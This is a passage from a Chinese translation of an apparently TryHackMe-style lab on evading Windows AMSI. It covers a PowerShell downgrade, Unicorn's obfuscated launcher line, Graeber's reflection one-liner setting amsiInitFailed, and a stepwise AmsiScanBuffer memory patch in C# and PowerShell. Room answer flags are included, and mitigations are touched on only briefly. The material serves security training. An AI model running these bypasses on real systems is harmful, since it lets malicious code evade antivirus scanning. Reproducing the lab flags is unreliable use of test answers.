class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ParseError</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">scriptExtent</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;ScriptContainedMaliciousContent&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ParserStrings</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ScriptContainedMaliciousContent</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">throw</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ParseException</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">new</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> parseError </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ScriptBlock</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">CheckSuspiciousContent</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">scriptBlockAst</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> null</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  HasSuspiciousContent </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">true</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>我们可以利用对 AMSI 实现机制的了解以及他人的研究，创建并使用绕过方法，滥用和规避 AMSI 或其工具。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>如果文件仅在磁盘上，AMSI 会被实现吗？(Y/N)</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">N</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="powershell-downgrade---powershell-降级攻击">PowerShell Downgrade - PowerShell 降级攻击<a href="#powershell-downgrade---powershell-降级攻击" class="hash-link" aria-label="Direct link to PowerShell Downgrade - PowerShell 降级攻击" title="Direct link to PowerShell Downgrade - PowerShell 降级攻击">​</a></h2>
<p>PowerShell 降级攻击是一种非常简单的攻击方式，它允许攻击者修改当前的 PowerShell 版本以移除安全功能。</p>
<p>大多数 PowerShell 会话会启动最新的 PowerShell 引擎，但攻击者可以通过一行命令手动更改版本。通过将 PowerShell 版本降级到 2.0，可以绕过安全功能，因为直到版本 5.0 才实现了这些安全功能。</p>
<p>该攻击只需在会话中执行一行命令即可。我们可以使用 <code>-Version</code> 标志启动一个新的 PowerShell 进程，指定版本（2）。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PowerShell -Version 2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>该攻击可以在像 <a href="https://github.com/trustedsec/unicorn" target="_blank" rel="noopener noreferrer">Unicorn</a> 这样的工具中看到实际的利用。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">full_attack = &#x27;&#x27;&#x27;powershell /w 1 /C &quot;sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\&#x27;&#x27;&#x27;&#x27;.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + &quot;)&quot; + &#x27;&quot;&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>由于该攻击如此简单且易于实施，蓝队有许多方法可以检测和缓解此攻击。</p>
<p>两种最简单的缓解措施是从设备中移除 PowerShell 2.0 引擎，并通过应用程序阻止列表拒绝访问 PowerShell 2.0。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>在 cmd.exe 中执行命令后，输入从桌面获得的标志。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{p0w3r5h3ll_d0wn6r4d3!}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="powershell-reflection---powershell-反射">PowerShell Reflection - PowerShell 反射<a href="#powershell-reflection---powershell-反射" class="hash-link" aria-label="Direct link to PowerShell Reflection - PowerShell 反射" title="Direct link to PowerShell Reflection - PowerShell 反射">​</a></h2>
<p>反射允许用户或管理员访问并与 .NET 程序集进行交互。根据微软文档，“程序集是 .NET 应用程序在部署、版本控制、重用、激活范围和安全权限方面的基本单位。” .NET 程序集可能看起来很陌生；然而，我们可以通过知道它们以常见格式（如 exe（可执行文件）和 dll（动态链接库））呈现的方式，使它们更加熟悉。</p>
<p>PowerShell 反射可以被滥用来修改和识别有价值的 DLL 信息。</p>
<p>PowerShell 的 AMSI 工具存储在 <code>System.Management.Automation.AmsiUtils</code> 中的 <code>AMSIUtils</code> .NET 程序集中。</p>
<p>Matt Graeber 发布了一个一行命令，用于通过反射修改和绕过 AMSI 工具。以下代码块展示了这个一行命令。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;).GetField(&#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;).SetValue($null,$true)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>为了说明代码功能，我们将其分解成更小的部分。</p>
<p>首先，代码片段将调用反射函数，并指定它想要使用来自 <code>[Ref.Assembly]</code> 的程序集。接着，它将使用 <code>GetType</code> 获取 AMSI 工具的类型。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>从上一部分收集的信息将被传递到下一个函数，通过 <code>GetField</code> 获取程序集中的指定字段。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.GetField(&#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>程序集和字段信息将被传递到下一个参数，通过 <code>SetValue</code> 将值从 <code>$false</code> 设置为 <code>$true</code>。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.SetValue($null,$true)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>一旦 <code>amsiInitFailed</code> 字段被设置为 <code>$true</code>，AMSI 将以响应代码 AMSI_RESULT_NOT_DETECTED = 1 做出响应。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>阅读以上内容并在提供的机器上练习利用一行命令。
要利用这行命令，您可以在与目标恶意代码相同的会话中运行它，或将其预先添加到恶意代码之前。</p><p>执行命令后，输入从桌面获得的标志。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{r3fl3c7_4ll_7h3_7h1n65}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="patching-amsi---修补-amsi">Patching AMSI - 修补 AMSI<a href="#patching-amsi---修补-amsi" class="hash-link" aria-label="Direct link to Patching AMSI - 修补 AMSI" title="Direct link to Patching AMSI - 修补 AMSI">​</a></h2>
<p>AMSI 主要从 <code>amsi.dll</code> 中进行加载和工具化；这一点可以从我们之前观察到的图表中确认。我们可以滥用该 DLL 并强制它指向我们想要的响应代码。<code>AmsiScanBuffer</code> 函数为我们提供了所需的钩子和功能，允许我们访问指向响应代码的指针/缓冲区。</p>
<p><code>AmsiScanBuffer</code> 是脆弱的，因为 <code>amsi.dll</code> 在 PowerShell 进程启动时就被加载；因此，我们的会话具有与该工具相同的权限级别。</p>
<p><code>AmsiScanBuffer</code> 会扫描一个“<a href="https://en.wikipedia.org/wiki/Data_buffer" target="_blank" rel="noopener noreferrer">缓冲区</a>”的可疑代码，并将其报告给 <code>amsi.dll</code>，以确定响应。如果我们控制了这个函数，就可以覆盖缓冲区并返回干净的响应代码。为了识别所需的缓冲区，我们需要进行一些逆向工程；幸运的是，这些研究和逆向工程已经完成。我们已经获得了所需的确切返回代码，用于获取干净的响应！</p>
<p>我们将分解由 BC-Security 修改并受到 Tal Liberman 启发的代码片段；您可以在<a href="https://github.com/BC-SECURITY/Empire/blob/master/empire/server/common/bypasses.py" target="_blank" rel="noopener noreferrer">这里</a>找到原始代码。RastaMouse 也有一个类似的 C# 绕过代码，使用相同的技术，您可以在<a href="https://github.com/rasta-mouse/AmsiScanBufferBypass" target="_blank" rel="noopener noreferrer">这里</a>找到它。</p>
<p>从高层次上讲，AMSI 修补可以分为四个步骤：</p>
<ol>
<li>获取 <code>amsi.dll</code> 的句柄</li>
<li>获取 <code>AmsiScanBuffer</code> 的进程地址</li>
<li>修改 <code>AmsiScanBuffer</code> 的内存保护</li>
<li>向 <code>AmsiScanBuffer</code> 写入操作码</li>
</ol>
<p>我们首先需要加载任何外部库或 API 调用，我们将从 <strong>kernel32</strong> 加载 <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress" target="_blank" rel="noopener noreferrer">GetProcAddress</a>、<a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea" target="_blank" rel="noopener noreferrer">GetModuleHandle</a> 和 <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect" target="_blank" rel="noopener noreferrer">VirtualProtect</a>，使用 <a href="https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke" target="_blank" rel="noopener noreferrer">p/invoke</a>。</p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[DllImport(`&quot;kernel32`&quot;)] // Import DLL where API call is stored</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public static extern IntPtr GetProcAddress( // API Call to import</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	IntPtr hModule, // Handle to DLL module</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	string procName // function or variable to obtain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[DllImport(`&quot;kernel32`&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public static extern IntPtr GetModuleHandle(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	string lpModuleName // Module to obtain handle</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[DllImport(`&quot;kernel32`&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public static extern bool VirtualProtect(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	IntPtr lpAddress, // Address of region to modify</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	UIntPtr dwSize, // Size of region</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	uint flNewProtect, // Memory protection options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	out uint lpflOldProtect // Pointer to store previous protection options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">); </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这些函数现在已经定义，但我们需要使用 <code>Add-Type</code> 来加载这些 API 调用。这个 cmdlet 将以适当的类型和命名空间加载这些函数，从而使得可以调用它们。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name &#x27;Kernel32&#x27; -NameSpace &#x27;Win32&#x27; -PassThru;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>现在我们可以调用 API 函数了，我们可以确定 <code>amsi.dll</code> 的位置以及如何访问该函数。首先，我们需要使用 <code>GetModuleHandle</code> 来获取 AMSI 的进程句柄。然后，这个句柄将用于通过 <code>GetProcAddress</code> 获取 <code>AmsiScanBuffer</code> 的进程地址。</p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$handle = [Win32.Kernel32]::GetModuleHandle(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	&#x27;amsi.dll&#x27; // Obtains handle to amsi.dll</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	$handle, // Handle of amsi.dll</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	&#x27;AmsiScanBuffer&#x27; // API call to obtain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">); </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>接下来，我们需要修改 <code>AmsiScanBuffer</code> 进程区域的内存保护。我们可以通过 <code>VirtualProtect</code> 来指定参数和缓冲区地址。</p>
<p>关于这些参数及其值的信息可以在之前提到的 API 文档中找到。</p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[UInt32]$Size = 0x5; // Size of region</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[UInt32]$ProtectFlag = 0x40; // PAGE_EXECUTE_READWRITE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[UInt32]$OldProtectFlag = 0; // Arbitrary value to store options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[Win32.Kernel32]::VirtualProtect(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	$BufferAddress, // Point to AmsiScanBuffer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	$Size, // Size of region</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	$ProtectFlag, // Enables R or RW access to region</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	[Ref]$OldProtectFlag // Pointer to store old options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">); </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
